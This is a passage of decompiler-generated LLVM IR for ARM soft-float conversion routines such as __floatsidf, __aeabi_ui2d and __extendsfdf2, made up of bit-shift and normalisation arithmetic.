  store i32 %v2_1e760, i32* @ip, align 4
  %v0_1e764 = load i32, i32* %r1.global-to-local, align 4
  %v3_1e764 = mul i32 %v0_1e764, 2
  %v4_1e764 = zext i1 %v1_1e760 to i32
  %v5_1e764 = or i32 %v3_1e764, %v4_1e764
  store i32 %v5_1e764, i32* %r1.global-to-local, align 4
  %v9_1e764 = icmp ule i32 %v5_1e764, %v0_1e764
  %v10_1e764 = icmp ult i32 %v3_1e764, %v0_1e764
  %v11_1e764 = select i1 %v1_1e760, i1 %v9_1e764, i1 %v10_1e764
  %v3_1e768 = mul i32 %arg1, 2
  %v4_1e768 = zext i1 %v11_1e764 to i32
  %v5_1e768 = or i32 %v4_1e768, %v3_1e768
  store i32 %v5_1e768, i32* %r0.global-to-local, align 4
  %v1_1e76c = and i32 %v3_1e768, 1048576
  %v2_1e76c = icmp eq i32 %v1_1e76c, 0
  %v0_1e770 = load i32, i32* @r4, align 4
  %v1_1e770 = add i32 %v0_1e770, -1
  store i32 %v1_1e770, i32* @r4, align 4
  br i1 %v2_1e76c, label %bb7, label %dec_label_pc_1e748

bb7:                                              ; preds = %dec_label_pc_1e760
  ret i32 %v5_1e768

; uselistorder directives
  uselistorder i32 %v0_1e764, { 1, 2, 0 }
  uselistorder i1 %v1_1e760, { 1, 0 }
  uselistorder i32 %v1_1e74c, { 1, 0 }
  uselistorder i32 %v0_1e748, { 1, 0 }
  uselistorder i32 %v0_1e734, { 1, 0, 2 }
  uselistorder i32 %v0_1e730, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_1e748._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1e748, { 0, 2, 1 }
}

define i32 @function_1e778(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e778:
  %v2_1e778 = icmp eq i32 %arg1, 0
  br i1 %v2_1e778, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_1e778
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_1e778
  %v1_1e78410 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_1e7e0 = phi i32 [ %arg1, %bb ], [ %v1_1e78410, %bb35 ]
  %v1_1e798 = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_1e790 = icmp ugt i32 %v0_1e7e0, 65535
  br i1 %v2_1e790, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_1e794 = and i32 %v0_1e7e0, 32768
  %v3_1e794 = icmp eq i32 %v2_1e794, 0
  %v4_1e794 = udiv i32 %v0_1e7e0, 65536
  br i1 %v3_1e794, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_1e798 = add nsw i32 %v1_1e798, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_1e7a4 = phi i32 [ %v1_1e798, %.thread ], [ %v1_1e798, %bb36 ], [ %v2_1e798, %bb37 ]
  %v1_1e7a0 = phi i32 [ %v0_1e7e0, %.thread ], [ %v4_1e794, %bb36 ], [ %v4_1e794, %bb37 ]
  %v2_1e79c = icmp ugt i32 %v1_1e7a0, 255
  br i1 %v2_1e79c, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_1e7a0 = and i32 %v1_1e7a0, 128
  %v3_1e7a0 = icmp eq i32 %v2_1e7a0, 0
  %v4_1e7a0 = udiv i32 %v1_1e7a0, 256
  br i1 %v3_1e7a0, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_1e7a4 = add nsw i32 %v1_1e7a4, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_1e7b0 = phi i32 [ %v1_1e7a4, %.thread3 ], [ %v1_1e7a4, %bb38 ], [ %v2_1e7a4, %bb39 ]
  %v1_1e7ac = phi i32 [ %v1_1e7a0, %.thread3 ], [ %v4_1e7a0, %bb38 ], [ %v4_1e7a0, %bb39 ]
  %v2_1e7a8 = icmp ugt i32 %v1_1e7ac, 15
  br i1 %v2_1e7a8, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_1e7ac = and i32 %v1_1e7ac, 8
  %v3_1e7ac = icmp eq i32 %v2_1e7ac, 0
  %v4_1e7ac = udiv i32 %v1_1e7ac, 16
  br i1 %v3_1e7ac, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_1e7b0 = add nsw i32 %v1_1e7b0, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_1e7b8 = phi i32 [ %v1_1e7b0, %.thread4 ], [ %v1_1e7b0, %bb40 ], [ %v2_1e7b0, %bb41 ]
  %v1_1e7c0 = phi i32 [ %v1_1e7ac, %.thread4 ], [ %v4_1e7ac, %bb40 ], [ %v4_1e7ac, %bb41 ]
  %v2_1e7b4 = icmp ugt i32 %v1_1e7c0, 3
  br i1 %v2_1e7b4, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
  %v2_1e7b8 = add i32 %v1_1e7b8, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_1e7bc = udiv i32 %v1_1e7c0, 2
  %v6_1e7bc = sub i32 %v1_1e7b8, %v5_1e7bc
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_1e7c0 = phi i32 [ %v6_1e7bc, %.thread6 ], [ %v2_1e7b8, %bb42 ]
  %v4_1e7c0 = udiv i32 %v1_1e7c0, 8
  %v5_1e7c0 = sub i32 %v0_1e7c0, %v4_1e7c0
  %v2_1e7c4 = add i32 %v5_1e7c0, -32
  %v4_1e7c4 = sub i32 31, %v5_1e7c0
  %v5_1e7c4 = and i32 %v4_1e7c4, %v5_1e7c0
  %v8_1e7c4 = icmp eq i32 %v5_1e7c0, 32
  %v6_1e7c8 = icmp slt i32 %v5_1e7c0, 32
  br i1 %v6_1e7c8, label %dec_label_pc_1e7cc, label %dec_label_pc_1e7ec

dec_label_pc_1e7cc:                               ; preds = %bb43
  %v2_1e7cc = add i32 %v5_1e7c0, -20
  %v7_1e7d0 = icmp sgt i32 %v2_1e7c4, -12
  br i1 %v7_1e7d0, label %dec_label_pc_1e7d4, label %dec_label_pc_1e7e8

dec_label_pc_1e7d4:                               ; preds = %dec_label_pc_1e7cc
  %v1_1e7d8 = sub i32 32, %v5_1e7c0
  %v6_1e7dc = shl i32 %v0_1e7e0, %v5_1e7c0
  store i32 %v6_1e7dc, i32* @r1, align 4
  %v6_1e7e0 = lshr i32 %v0_1e7e0, %v1_1e7d8
  br label %.thread31

dec_label_pc_1e7e8:                               ; preds = %dec_label_pc_1e7cc
  %v8_1e7cc = icmp eq i32 %v2_1e7cc, 0
  %v4_1e7cc = add i32 %v5_1e7c0, 2147483616
  %v5_1e7cc = and i32 %v2_1e7cc, %v4_1e7cc
  br label %dec_label_pc_1e7ec

dec_label_pc_1e7ec:                               ; preds = %bb43, %dec_label_pc_1e7e8
  %v1_1e7f8.in = phi i32 [ %v2_1e7c4, %bb43 ], [ %v2_1e7cc, %dec_label_pc_1e7e8 ]
  %v6_1e7f8 = phi i32 [ %v2_1e7c4, %bb43 ], [ %v5_1e7c0, %dec_label_pc_1e7e8 ]
  %v2_1e7f8.in = phi i32 [ %v5_1e7c4, %bb43 ], [ %v5_1e7cc, %dec_label_pc_1e7e8 ]
  %v0_1e7f8 = phi i1 [ %v8_1e7c4, %bb43 ], [ %v8_1e7cc, %dec_label_pc_1e7e8 ]
  %v1_1e7f8 = icmp slt i32 %v1_1e7f8.in, 0
  %v2_1e7f8 = icmp slt i32 %v2_1e7f8.in, 0
  %v3_1e7ec = xor i1 %v2_1e7f8, %v1_1e7f8
  %v4_1e7ec = or i1 %v0_1e7f8, %v3_1e7ec
  br i1 %v4_1e7ec, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_1e7ec
  %v6_1e7ec = sub i32 32, %v6_1e7f8
  store i32 %v6_1e7ec, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1e7ec, %bb44
  %v6_1e7f0 = shl i32 %v0_1e7e0, %v6_1e7f8
  br i1 %v4_1e7ec, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_1e7f4 = load i32, i32* @r1, align 4
  %v7_1e7f4 = load i32, i32* @ip, align 4
  %v12_1e7f4 = lshr i32 %v6_1e7f4, %v7_1e7f4
  %v13_1e7f4 = or i32 %v12_1e7f4, %v6_1e7f0
  %v11_1e7f8 = shl i32 %v6_1e7f4, %v6_1e7f8
  store i32 %v11_1e7f8, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_1e7d4, %bb46
  %v1_1e844 = phi i32 [ %v6_1e7e0, %dec_label_pc_1e7d4 ], [ %v13_1e7f4, %bb46 ], [ %v6_1e7f0, %bb45 ]
  %v0_1e7fc = load i32, i32* @r4, align 4
  %v2_1e7fc = sub i32 %v0_1e7fc, %v5_1e7c0
  %v5_1e800 = icmp slt i32 %v0_1e7fc, %v5_1e7c0
  br i1 %v5_1e800, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_1e800 = mul i32 %v2_1e7fc, 1048576
  %v11_1e800 = add i32 %v10_1e800, %v1_1e844
  %v7_1e804 = load i32, i32* @r5, align 4
  %v8_1e804 = or i32 %v7_1e804, %v11_1e800
  ret i32 %v8_1e804

bb48:                                             ; preds = %.thread31
  %v2_1e810 = sub i32 -32, %v2_1e7fc
  %v6_1e814 = icmp sgt i32 %v2_1e7fc, -32
  br i1 %v6_1e814, label %dec_label_pc_1e818, label %dec_label_pc_1e850

dec_label_pc_1e818:                               ; preds = %bb48
  %v1_1e818 = add i32 %v2_1e810, 12
  %v8_1e81c = icmp sgt i32 %v1_1e818, 0
  br i1 %v8_1e81c, label %dec_label_pc_1e838, label %dec_label_pc_1e820

dec_label_pc_1e820:                               ; preds = %dec_label_pc_1e818
  %v1_1e820 = add i32 %v2_1e810, 32
  %v0_1e830 = load i32, i32* @r5, align 4
  %v7_1e830 = lshr i32 %v1_1e844, %v1_1e820
  %v8_1e830 = or i32 %v0_1e830, %v7_1e830
  ret i32 %v8_1e830

dec_label_pc_1e838:                               ; preds = %dec_label_pc_1e818
  %v0_1e848 = load i32, i32* @r5, align 4
  ret i32 %v0_1e848

dec_label_pc_1e850:                               ; preds = %bb48
  %v0_1e854 = load i32, i32* @r5, align 4
  ret i32 %v0_1e854

; uselistorder directives
  uselistorder i32 %v2_1e7fc, { 1, 0, 2 }
  uselistorder i32 %v1_1e844, { 1, 0 }
  uselistorder i32 %v6_1e7f0, { 1, 0 }
  uselistorder i32 %v2_1e7c4, { 1, 0, 2 }
  uselistorder i32 %v5_1e7c0, { 5, 4, 6, 2, 7, 1, 3, 8, 9, 0, 11, 10 }
  uselistorder i32 %v4_1e7ac, { 1, 0 }
  uselistorder i32 %v1_1e7ac, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1e7a0, { 1, 0 }
  uselistorder i32 %v1_1e7a0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1e794, { 1, 0 }
  uselistorder i32 %v0_1e7e0, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 -12, { 3, 1, 2, 4, 16, 17, 5, 19, 20, 6, 21, 22, 18, 15, 14, 13, 12, 11, 23, 24, 25, 7, 8, 9, 26, 10, 27, 30, 28, 29, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 13, 14, 15, 22, 2, 4, 5, 3, 16, 8, 6, 9, 7, 17, 23, 24, 25, 26, 19, 18, 20, 0, 10, 1, 11, 21, 12 }
  uselistorder i32 15, { 4, 5, 3, 8, 12, 9, 0, 13, 6, 1, 15, 14, 2, 7, 10, 11 }
  uselistorder i32 -8, { 7, 8, 1, 9, 10, 11, 36, 18, 19, 20, 21, 22, 23, 17, 16, 5, 15, 14, 13, 12, 24, 25, 26, 27, 6, 28, 3, 37, 29, 38, 30, 31, 4, 39, 35, 32, 33, 34, 2, 0 }
  uselistorder i32 128, { 17, 18, 9, 10, 7, 8, 13, 24, 12, 11, 23, 0, 1, 5, 2, 14, 25, 26, 3, 4, 15, 27, 6, 20, 16, 28, 19, 21, 22 }
  uselistorder i32 255, { 14, 15, 4, 18, 19, 3, 5, 6, 17, 21, 0, 1, 2, 20, 16, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 -16, { 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 2, 0, 23 }
  uselistorder i32 65535, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 52, { 2, 18, 13, 14, 5, 6, 7, 8, 16, 11, 17, 15, 12, 20, 3, 21, 0, 4, 1, 19, 9, 10 }
  uselistorder i32 20, { 5, 36, 37, 2, 42, 0, 45, 38, 39, 15, 16, 17, 18, 40, 41, 35, 52, 8, 53, 3, 9, 43, 10, 46, 47, 44, 32, 33, 34, 19, 11, 20, 21, 1, 54, 12, 55, 4, 6, 48, 49, 50, 51, 22, 23, 24, 25, 26, 27, 28, 29, 7, 13, 30, 14, 31 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_1e7ec, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1e85c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1e85c:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_1e85c = load i32, i32* @r4, align 4
  %v2_1e85c = icmp eq i32 %v0_1e85c, 0
  %v1_1e860 = xor i32 %arg3, 1048576
  store i32 %v1_1e860, i32* @r2, align 4
  br i1 %v2_1e85c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1e85c
  %v2_1e864 = xor i32 %arg1, 1048576
  store i32 %v2_1e864, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1e85c
  %v1_1e86c = load i32, i32* @r5, align 4
  %v2_1e86c = add i32 %v1_1e86c, -1
  store i32 %v2_1e86c, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1e870 = call i32 @function_1e6c8()
  %v0_1e874 = load i32, i32* @r4, align 4
  %v0_1e874.off = add i32 %v0_1e874, 4194303
  %tmp = icmp ult i32 %v0_1e874.off, 2097152
  %v1_1e8f0 = load i32, i32* @r5, align 4
  %v1_1e8f0.off = add i32 %v1_1e8f0, 4194303
  %tmp45 = icmp ult i32 %v1_1e8f0.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_1e880

dec_label_pc_1e880:                               ; preds = %bb33
  %v4_1e880 = icmp eq i32 %v1_1e8f0, %v0_1e874
  %v1_1e884 = load i32, i32* @r1, align 4
  br i1 %v4_1e880, label %bb34, label %dec_label_pc_1e88c

bb34:                                             ; preds = %dec_label_pc_1e880
  %v2_1e884 = load i32, i32* @r3, align 4
  %v5_1e884 = icmp eq i32 %v2_1e884, %v1_1e884
  br i1 %v5_1e884, label %dec_label_pc_1e89c, label %dec_label_pc_1e88c

dec_label_pc_1e88c:                               ; preds = %dec_label_pc_1e880, %bb34
  %v2_1e88c = or i32 %v1_1e884, %v0_1e874
  %v4_1e88c = icmp eq i32 %v2_1e88c, 0
  br i1 %v4_1e88c, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_1e88c
  %v1_1e890 = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1e88c, %bb35
  %v11_1e898 = phi i32 [ %v0_1e870, %dec_label_pc_1e88c ], [ %v1_1e890, %bb35 ]
  ret i32 %v11_1e898

dec_label_pc_1e89c:                               ; preds = %bb34
  %v1_1e89c = load i32, i32* @r2, align 4
  %v4_1e89c = icmp eq i32 %v1_1e89c, %v0_1e870
  br i1 %v4_1e89c, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_1e89c
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_1e89c
  %tmp46 = icmp ult i32 %v0_1e874, 2097152
  br i1 %tmp46, label %dec_label_pc_1e8b4, label %dec_label_pc_1e8c4

dec_label_pc_1e8b4:                               ; preds = %.thread8
  %v1_1e8b4 = icmp slt i32 %v1_1e884, 0
  %v3_1e8b8 = mul i32 %v0_1e870, 2
  %v4_1e8b8 = zext i1 %v1_1e8b4 to i32
  %v5_1e8b8 = or i32 %v4_1e8b8, %v3_1e8b8
  %v9_1e8b8 = icmp ule i32 %v5_1e8b8, %v0_1e870
  %v10_1e8b8 = icmp ult i32 %v3_1e8b8, %v0_1e870
  %v11_1e8b8 = select i1 %v1_1e8b4, i1 %v9_1e8b8, i1 %v10_1e8b8
  br i1 %v11_1e8b8, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_1e8b4
  %v2_1e8bc = or i32 %v5_1e8b8, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_1e8b4, %bb37
  %v11_1e8c0 = phi i32 [ %v5_1e8b8, %dec_label_pc_1e8b4 ], [ %v2_1e8bc, %bb37 ]
  ret i32 %v11_1e8c0

dec_label_pc_1e8c4:                               ; preds = %.thread8
  %v2_1e8c4 = icmp ugt i32 %v0_1e874, -4194305
  br i1 %v2_1e8c4, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_1e8c4
  %v2_1e8c8 = add i32 %v0_1e870, 1048576
  ret i32 %v2_1e8c8

.thread9:                                         ; preds = %dec_label_pc_1e8c4
  %v1_1e8d0 = and i32 %v0_1e870, -2147483648
  %v1_1e8d8 = or i32 %v1_1e8d0, 2146435072
  ret i32 %v1_1e8d8

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_1e8fc.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_1e870, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_1e8e8 = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_1e8fc27 = phi i32 [ %v0_1e870, %.thread14 ], [ %v1_1e8e8, %bb40 ]
  %v1_1e8f8.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_1e8f8 = load i32, i32* %v1_1e8f8.in, align 4
  store i32 %v1_1e8f8, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
  %v1_1e908 = phi i32 [ %v0_1e870, %.thread11..thread13_crit_edge ], [ %v1_1e8fc27, %bb41 ]
  %v0_1e8fc = phi i32 [ %v0_1e8fc.pre, %.thread11..thread13_crit_edge ], [ %v1_1e8f8, %bb41 ]
  %v4_1e8fc = mul i32 %v1_1e908, 4096
  %v5_1e8fc = or i32 %v4_1e8fc, %v0_1e8fc
  %v7_1e8fc = icmp eq i32 %v5_1e8fc, 0
  br i1 %v7_1e8fc, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_1e900 = load i32, i32* @r3, align 4
  %v2_1e900 = load i32, i32* @r2, align 4
  %v5_1e900 = mul i32 %v2_1e900, 4096
  %v6_1e900 = or i32 %v5_1e900, %v1_1e900
  %v8_1e900 = icmp eq i32 %v6_1e900, 0
  br i1 %v8_1e900, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_1e904 = icmp eq i32 %v2_1e900, %v1_1e908
  br i1 %v5_1e904, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_1e908 = or i32 %v1_1e908, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_1e90c = phi i32 [ %v1_1e908, %bb43 ], [ %v2_1e908, %.thread17 ]
  ret i32 %v11_1e90c

; uselistorder directives
  uselistorder i32 %v1_1e908, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1e8f8, { 1, 0 }
  uselistorder i1 %v1_1e8b4, { 1, 0 }
  uselistorder i32 %v1_1e884, { 2, 1, 0 }
  uselistorder i32 %v0_1e874, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_1e870, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1e88c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1e910 = icmp eq i32 %arg1, 0
  br i1 %v2_1e910, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_1e934 = call i32 @function_1e778(i32 0)
  ret i32 %v1_1e934
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1e938 = icmp eq i32 %arg1, 0
  br i1 %v2_1e938, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  store i32 1074, i32* @r4, align 4
  %v1_1e950 = and i32 %arg1, -2147483648
  store i32 %v1_1e950, i32* @r5, align 4
  %v2_1e950 = icmp eq i32 %v1_1e950, 0
  br i1 %v2_1e950, label %bb5, label %bb4

bb4:                                              ; preds = %.thread
  %v2_1e954 = sub i32 0, %arg1
  br label %bb5

bb5:                                              ; preds = %.thread, %bb4
  %v0_1e958 = phi i32 [ %arg1, %.thread ], [ %v2_1e954, %bb4 ]
  store i32 %v0_1e958, i32* @r1, align 4
  %v1_1e960 = call i32 @function_1e778(i32 0)
  ret i32 %v1_1e960

; uselistorder directives
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1e964 = mul i32 %arg1, 2
  %v4_1e964 = icmp eq i32 %v2_1e964, 0
  %v1_1e968 = and i32 %v2_1e964, 4
  %v2_1e968 = icmp ne i32 %v1_1e968, 0
  %v3_1e968 = sdiv i32 %v2_1e964, 8
  %v3_1e96c = zext i1 %v2_1e968 to i32
  %v6_1e96c = zext i32 %v3_1e968 to i64
  %v7_1e96c = sub nsw i32 33, %v3_1e968
  %v8_1e96c = zext i32 %v7_1e96c to i64
  %v9_1e96c = shl i64 %v6_1e96c, %v8_1e96c
  %v10_1e96c = sub nsw i32 32, %v3_1e968
  %v11_1e96c = shl i32 %v3_1e96c, %v10_1e96c
  %v12_1e96c = zext i32 %v11_1e96c to i64
  %v14_1e96c = or i64 %v12_1e96c, %v9_1e96c
  %v15_1e96c = trunc i64 %v14_1e96c to i32
  %v3_1e970 = mul i32 %arg1, 536870912
  store i32 %v3_1e970, i32* @r1, align 4
  br i1 %v4_1e964, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v4_1e974 = icmp ult i32 %v2_1e964, 16777216
  br i1 %v4_1e974, label %bb12, label %bb9

bb9:                                              ; preds = %bb
  %v4_1e98818 = icmp ugt i32 %v2_1e964, -16777217
  br i1 %v4_1e98818, label %bb11.thread, label %bb10

bb11.thread:                                      ; preds = %bb9
  br label %.thread3

bb10:                                             ; preds = %bb9
  %v2_1e97c6 = xor i32 %v15_1e96c, 939524096
  ret i32 %v2_1e97c6

.thread2:                                         ; preds = %entry
  br label %.thread3

.thread3:                                         ; preds = %bb11.thread, %.thread2
  ret i32 %v15_1e96c

bb12:                                             ; preds = %bb
  store i32 896, i32* @r4, align 4
  %v1_1e998 = and i32 %v15_1e96c, -2147483648
  store i32 %v1_1e998, i32* @r5, align 4
  %tmp = bitcast i32 %v15_1e96c to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1e99c = bitcast float %tmp19 to i32
  %v1_1e9a0 = call i32 @function_1e778(i32 %v1_1e99c)
  ret i32 %v1_1e9a0

; uselistorder directives
  uselistorder i32 %v15_1e96c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1e968, { 1, 2, 0 }
  uselistorder i32 %v2_1e964, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32)* @function_1e778, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1e9a4 = or i32 %arg2, %arg1
  %v4_1e9a4 = icmp eq i32 %v2_1e9a4, 0
  br i1 %v4_1e9a4, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  store i32 0, i32* @r5, align 4
  %v0_1e9b4 = call i32 @function_1e9d4()
  ret i32 %v0_1e9b4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1e9b8 = or i32 %arg2, %arg1
  %v4_1e9b8 = icmp eq i32 %v2_1e9b8, 0
  br i1 %v4_1e9b8, label %bb, label %bb3

bb:                                               ; preds = %entry
  ret i32 %arg1

bb3:                                              ; preds = %entry
  %v1_1e9c8 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1e9c8, i32 ptrtoint (i32* @global_var_1e9d4.1783 to i32))
  %v1_1e9cc = sub i32 0, %arg1
  ret i32 %v1_1e9cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_1e9d4() local_unnamed_addr {
dec_label_pc_1e9d4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1e9dc = load i32, i32* @r0, align 4
  %v0_1e9e0 = load i32, i32* @r1, align 4
  store i32 %v0_1e9e0, i32* %r0.global-to-local, align 4
  store i32 %v0_1e9dc, i32* %r1.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1e9e0, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1e71c.1781 to i32))
  %tmp6 = icmp ult i32 %v0_1e9e0, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1e9d4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1e9d4, %bb
  %v1_1ea00 = phi i32 [ 3, %dec_label_pc_1e9d4 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1e9e0, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1ea00 = add nuw nsw i32 %v1_1ea00, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1ea04 = phi i32 [ %v1_1ea00, %bb3 ], [ %v2_1ea00, %bb4 ]
  %not. = icmp slt i32 %v0_1e9e0, 0
  %v4_1ea04 = zext i1 %not. to i32
  %v5_1ea04 = add nsw i32 %v0_1ea04, %v4_1ea04
  %v1_1ea08 = sub nsw i32 32, %v5_1ea04
  %v0_1ea0c = load i32, i32* %r1.global-to-local, align 4
  %v6_1ea0c = shl i32 %v0_1ea0c, %v1_1ea08
  store i32 %v6_1ea0c, i32* @ip, align 4
  %v6_1ea10 = lshr i32 %v0_1ea0c, %v5_1ea04
  %v1_1ea14 = load i32, i32* %r0.global-to-local, align 4
  %v7_1ea14 = shl i32 %v1_1ea14, %v1_1ea08
  %v8_1ea14 = or i32 %v7_1ea14, %v6_1ea10
  store i32 %v8_1ea14, i32* %r1.global-to-local, align 4
  %v6_1ea18 = lshr i32 %v1_1ea14, %v5_1ea04
  store i32 %v6_1ea18, i32* %r0.global-to-local, align 4
  %v0_1ea1c = load i32, i32* %r4.global-to-local, align 4
  %v2_1ea1c = add i32 %v0_1ea1c, %v5_1ea04
  store i32 %v2_1ea1c, i32* @r4, align 4
  %v4_1ea20 = sext i32 %v8_1ea14 to i64
  %v5_1ea20 = call i32 @function_1e71c(i32 %v6_1ea18, i64 %v4_1ea20, i32 %v5_1ea04, i32 %v1_1ea08)
  store i32 %v5_1ea20, i32* %r0.global-to-local, align 4
  ret i32 %v5_1ea20

; uselistorder directives
  uselistorder i32 %v5_1ea04, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 6, { 2, 26, 27, 28, 1, 17, 18, 21, 19, 20, 29, 30, 31, 32, 3, 4, 36, 33, 34, 5, 35, 0, 6, 7, 8, 9, 10, 22, 23, 11, 13, 14, 15, 16, 12, 24, 25 }
